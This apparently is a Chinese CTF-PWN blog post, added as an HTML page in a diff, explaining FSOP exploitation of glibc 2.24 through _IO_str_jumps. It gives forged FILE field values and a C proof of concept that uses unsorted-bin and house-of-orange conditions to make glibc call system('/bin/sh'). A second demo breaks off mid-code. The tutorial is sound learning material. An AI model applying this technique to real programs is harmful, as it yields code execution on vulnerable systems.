@@ -1,0 +1,1300 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="IO_FILE --glibc2.24, Matrix">
+    <meta name="description" content="FSOP
+在新版本的 glibc 中 (2.24)，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。如果 vtable 是非法的，那么会引发 a">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>IO_FILE --glibc2.24 | Matrix</title>
+    <link rel="icon" type="image/jpeg" href="/medias/matrix.jpg">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="container">
+            <div class="nav-wrapper">
+                <div class="brand-logo">
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <img src="/medias/matrix.jpg" class="logo-img hide-on-small-only">
+                        
+                        <span class="logo-span">Matrix</span>
+                    </a>
+                </div>
+                
+
+<a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li>
+        <a id="toggleSearch" class="waves-effect waves-light">
+            <i id="searchIcon" class="mdi-action-search" title="搜索"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div class="side-nav" id="mobile-nav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/matrix.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Matrix</div>
+        <div class="logo-desc">
+            
+            Fight Against Your Fate!
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        
+    </ul>
+
+    <div class="social-link">
+
+
+    <a href="mailto:2337463603@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2334763603" target="_blank" rel="noopener" class="tooltipped" data-tooltip="QQ联系我: 2334763603" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+</div>
+</div>
+
+            </div>
+        </div>
+
+        
+    </nav>
+</header>
+
+
+
+
+
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        IO_FILE --glibc2.24
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/" target="_blank">
+                                <span class="chip bg-color">原理学习</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF-PWN/" class="post-category" target="_blank">
+                                CTF-PWN
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-11-07
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        3.2k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        15 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><blockquote>
+<p>在新版本的 glibc 中 (2.24)，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。<br>如果 vtable 是非法的，那么会引发 abort。<br>首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。<br>这里的检查使得以往使用 vtable 进行利用的技术很难实现<br>在glibc中由于对vtable合法性的检查，伪造vtbale的方法不可行了，同时由于FSOP在劫持_IO_list_all后也是伪造vtable表来获得shell，所以这个方法也受到了影响。<br>但是没有完全不可使用。<br>之前的利用方法是：通过报错或退出程序，执行fflush，来调用每个FILE中_IO_file_jumps中的_IO_overflow。现在_IO_file_jumps这个vtable会进行检查，但是还有其他vtable是不受检查的：<strong>IO_str_jumps 和 IO_wstr_jumps 这两个结构体 可以绕过check</strong>。IO_str_jumps 相对简单利用，主要学习这个。</p>
+</blockquote>
+<h3 id="IO-str-jumps-表"><a href="#IO-str-jumps-表" class="headerlink" title="IO_str_jumps 表"></a>IO_str_jumps 表</h3><pre class=" language-c"><code class="language-c">pwndbg<span class="token operator">></span> p _IO_str_jumps 
+$<span class="token number">6</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
+  __dummy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> 
+  __dummy2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> 
+  __finish <span class="token operator">=</span> <span class="token number">0x7ffff7ab28d0</span> <span class="token operator">&lt;</span>_IO_str_finish<span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+  __overflow <span class="token operator">=</span> <span class="token number">0x7ffff7ab25b0</span> <span class="token operator">&lt;</span>__GI__IO_str_overflow<span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>fflush调用
+  __underflow <span class="token operator">=</span> <span class="token number">0x7ffff7ab2550</span> <span class="token operator">&lt;</span>__GI__IO_str_underflow<span class="token operator">></span><span class="token punctuation">,</span> 
+  __uflow <span class="token operator">=</span> <span class="token number">0x7ffff7ab10d0</span> <span class="token operator">&lt;</span>__GI__IO_default_uflow<span class="token operator">></span><span class="token punctuation">,</span> 
+  __pbackfail <span class="token operator">=</span> <span class="token number">0x7ffff7ab28b0</span> <span class="token operator">&lt;</span>__GI__IO_str_pbackfail<span class="token operator">></span><span class="token punctuation">,</span> 
+  __xsputn <span class="token operator">=</span> <span class="token number">0x7ffff7ab1130</span> <span class="token operator">&lt;</span>__GI__IO_default_xsputn<span class="token operator">></span><span class="token punctuation">,</span> 
+  __xsgetn <span class="token operator">=</span> <span class="token number">0x7ffff7ab12b0</span> <span class="token operator">&lt;</span>__GI__IO_default_xsgetn<span class="token operator">></span><span class="token punctuation">,</span> 
+  __seekoff <span class="token operator">=</span> <span class="token number">0x7ffff7ab2a00</span> <span class="token operator">&lt;</span>__GI__IO_str_seekoff<span class="token operator">></span><span class="token punctuation">,</span> 
+  __seekpos <span class="token operator">=</span> <span class="token number">0x7ffff7ab1490</span> <span class="token operator">&lt;</span>_IO_default_seekpos<span class="token operator">></span><span class="token punctuation">,</span> 
+  __setbuf <span class="token operator">=</span> <span class="token number">0x7ffff7ab1360</span> <span class="token operator">&lt;</span>_IO_default_setbuf<span class="token operator">></span><span class="token punctuation">,</span> 
+  __sync <span class="token operator">=</span> <span class="token number">0x7ffff7ab1710</span> <span class="token operator">&lt;</span>_IO_default_sync<span class="token operator">></span><span class="token punctuation">,</span> 
+  __doallocate <span class="token operator">=</span> <span class="token number">0x7ffff7ab1500</span> <span class="token operator">&lt;</span>__GI__IO_default_doallocate<span class="token operator">></span><span class="token punctuation">,</span> 
+  __read <span class="token operator">=</span> <span class="token number">0x7ffff7ab2400</span> <span class="token operator">&lt;</span>_IO_default_read<span class="token operator">></span><span class="token punctuation">,</span> 
+  __write <span class="token operator">=</span> <span class="token number">0x7ffff7ab2410</span> <span class="token operator">&lt;</span>_IO_default_write<span class="token operator">></span><span class="token punctuation">,</span> 
+  __seek <span class="token operator">=</span> <span class="token number">0x7ffff7ab23e0</span> <span class="token operator">&lt;</span>_IO_default_seek<span class="token operator">></span><span class="token punctuation">,</span> 
+  __close <span class="token operator">=</span> <span class="token number">0x7ffff7ab1710</span> <span class="token operator">&lt;</span>_IO_default_sync<span class="token operator">></span><span class="token punctuation">,</span> 
+  __stat <span class="token operator">=</span> <span class="token number">0x7ffff7ab23f0</span> <span class="token operator">&lt;</span>_IO_default_stat<span class="token operator">></span><span class="token punctuation">,</span> 
+  __showmanyc <span class="token operator">=</span> <span class="token number">0x7ffff7ab2420</span> <span class="token operator">&lt;</span>_IO_default_showmanyc<span class="token operator">></span><span class="token punctuation">,</span> 
+  __imbue <span class="token operator">=</span> <span class="token number">0x7ffff7ab2430</span> <span class="token operator">&lt;</span>_IO_default_imbue<span class="token operator">></span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">const</span> <span class="token keyword">struct</span> _IO_jump_t _IO_str_jumps libio_vtable <span class="token operator">=</span>
+<span class="token punctuation">{</span>
+  JUMP_INIT_DUMMY<span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_str_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> _IO_str_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+  <span class="token punctuation">}</span></code></pre>
+<p>与_IO_file_jumps调用vtable中的指针是一样的，在FILE结构体成员的指引下，从vtable中调用函数指针，只不过这里我们要调用IO_str_jumps 这个虚表中的指针。</p>
+<p>其中主要是利用__overflow 和 __finish 这两个函数的调用。</p>
+<h3 id="finish调用"><a href="#finish调用" class="headerlink" title="__finish调用"></a>__finish调用</h3><p>源代码：</p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">_IO_str_finish</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">int</span> dummy<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_USER_BUF<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_strfile <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token punctuation">)</span><span class="token operator">-></span>_s<span class="token punctuation">.</span>_free_buffer<span class="token punctuation">)</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//call qword ptr [fp+0E8h]  指针函数</span>
+  fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+  <span class="token function">_IO_default_finish</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>其中_s._free_buffer如下：</p>
+<pre class=" language-c"><code class="language-c">      _freeres_buf <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+      __pad5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> 
+      _mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> 
+      _unused2 <span class="token operator">=</span> <span class="token string">'\000'</span> <span class="token operator">&lt;</span>repeats <span class="token number">19</span> times<span class="token operator">></span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span> 
+    vtable <span class="token operator">=</span> <span class="token number">0x7ffff7dd1440</span> <span class="token operator">&lt;</span>__GI__IO_file_jumps<span class="token operator">></span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span> 
+  _s <span class="token operator">=</span> <span class="token punctuation">{</span>
+    _allocate_buffer <span class="token operator">=</span> <span class="token number">0x7ffff7dd5520</span> <span class="token operator">&lt;</span>_IO_2_1_stderr_<span class="token operator">></span><span class="token punctuation">,</span>  
+    _free_buffer <span class="token operator">=</span> <span class="token number">0x7ffff7dd5600</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">></span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>函数调用处  offset <span class="token operator">=</span> <span class="token number">0xe8</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>上面是FILE_plus结构体，也就是说这个_IO_strfile 是两个结构体的封装。</p>
+<p>那么只需绕过if判断即可：</p>
+<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*别忘了_IO_flush_all_lockp的检查*/</span>
+fp<span class="token operator">-></span>_mode <span class="token operator">=</span> <span class="token number">0</span>
+fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">=</span> <span class="token number">1</span> 
+fp<span class="token operator">-></span>_IO_write_base <span class="token operator">=</span> <span class="token number">0</span> 
+
+fp<span class="token operator">-></span>_flags <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment" spellcheck="true">//绕过</span>
+fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">=</span> <span class="token operator">/</span>bin<span class="token operator">/</span>sh_addr   <span class="token comment" spellcheck="true">//参数</span>
+fp<span class="token operator">+</span><span class="token number">0xe8</span> <span class="token operator">=</span> system_addr <span class="token comment" spellcheck="true">//函数指针</span>
+vtable <span class="token operator">=</span> IO_str_jumps  <span class="token operator">-</span> <span class="token number">8</span>  <span class="token comment" spellcheck="true">//这样本来要调用__overflow 就会调用 __finish</span></code></pre>
+<h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token keyword">int</span> <span class="token function">winner</span> <span class="token punctuation">(</span> <span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>p1<span class="token punctuation">,</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>
+    size_t io_list_all<span class="token punctuation">,</span> <span class="token operator">*</span>top<span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// unsorted bin attack</span>
+    p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    top <span class="token operator">=</span> <span class="token punctuation">(</span>size_t <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> p1 <span class="token operator">+</span> <span class="token number">0x400</span> <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    top<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xc01</span><span class="token punctuation">;</span>
+    p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    io_list_all <span class="token operator">=</span> top<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x9a8</span><span class="token punctuation">;</span>
+    top<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> io_list_all <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// _IO_str_overflow conditions</span>
+    <span class="token keyword">char</span> binsh_in_libc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/bin/sh\x00"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// we can found "/bin/sh" in libc, here i create it in stack</span>
+
+    top<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//_flags</span>
+    top<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// write_base</span>
+    top<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// write_ptr</span>
+    top<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">)</span><span class="token operator">&amp;</span>binsh_in_libc<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// buf_base</span>
+    <span class="token comment" spellcheck="true">// house_of_orange conditions</span>
+    top<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x61</span><span class="token punctuation">;</span>
+    top<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//mode</span>
+    top<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x7ffff7dd1500</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//_IO_str_jumps </span>
+    top<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">)</span> <span class="token operator">&amp;</span>winner<span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">/* Finally, trigger the whole chain by calling malloc */</span>
+    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">int</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span>
+<span class="token punctuation">{</span> 
+    <span class="token function">system</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<h3 id="overflow-调用"><a href="#overflow-调用" class="headerlink" title="__overflow 调用"></a>__overflow 调用</h3><p>这个相对难一点，源码：</p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)</span>
+<span class="token keyword">int</span> <span class="token function">_IO_str_overflow</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+     <span class="token keyword">int</span> flush_only <span class="token operator">=</span> c <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
+<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">//这里的判断只要_flags==0直接通关</span>
+     pos <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">>=</span> <span class="token punctuation">(</span>_IO_size_t<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">_IO_blen</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">+</span> flush_only<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_USER_BUF<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// not allowed 绕过  _IO_USER_BUF(0x01) </span>
+    <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
+      <span class="token keyword">else</span>
+    <span class="token punctuation">{</span>
+      <span class="token keyword">char</span> <span class="token operator">*</span>new_buf<span class="token punctuation">;</span>
+      <span class="token keyword">char</span> <span class="token operator">*</span>old_buf <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>
+      size_t old_blen <span class="token operator">=</span> <span class="token function">_IO_blen</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      _IO_size_t new_size <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> old_blen <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//fp->_IO_buf_end = (bin_sh_addr - 100) / 2          </span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>new_size <span class="token operator">&lt;</span> old_blen<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//绕过</span>
+        <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
+      new_buf
+        <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_strfile <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token punctuation">)</span><span class="token operator">-></span>_s<span class="token punctuation">.</span>_allocate_buffer<span class="token punctuation">)</span> <span class="token punctuation">(</span>new_size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//也是一样的函数指针调用  fp+0xe8 = system_addr</span>
+    <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
+<span class="token punctuation">}</span></code></pre>
+<p>构造方法：</p>
+<pre class=" language-c"><code class="language-c">fp<span class="token operator">-></span>_mode <span class="token operator">=</span> <span class="token number">0</span>
+
+fp<span class="token operator">-></span>_flags <span class="token operator">=</span> <span class="token number">0</span>
+fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">=</span> <span class="token number">0</span>
+fp<span class="token operator">-></span>_IO_buf_end <span class="token operator">=</span> <span class="token punctuation">(</span>bin_sh_addr <span class="token operator">-</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span>
+fp<span class="token operator">-></span>_IO_write_base <span class="token operator">=</span> <span class="token number">0</span>
+fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">=</span> <span class="token punctuation">(</span>bin_sh_addr <span class="token operator">-</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span>
+fp<span class="token operator">+</span><span class="token number">0xe0</span> <span class="token operator">=</span> system_addr</code></pre>
+<h4 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h4><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token keyword">int</span> <span class="token function">winner</span> <span class="token punctuation">(</span> <span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>p1<span class="token punctuation">,</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>
+    size_t io_list_all<span class="token punctuation">,</span> <span class="token operator">*</span>top<span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// unsorted bin attack</span>
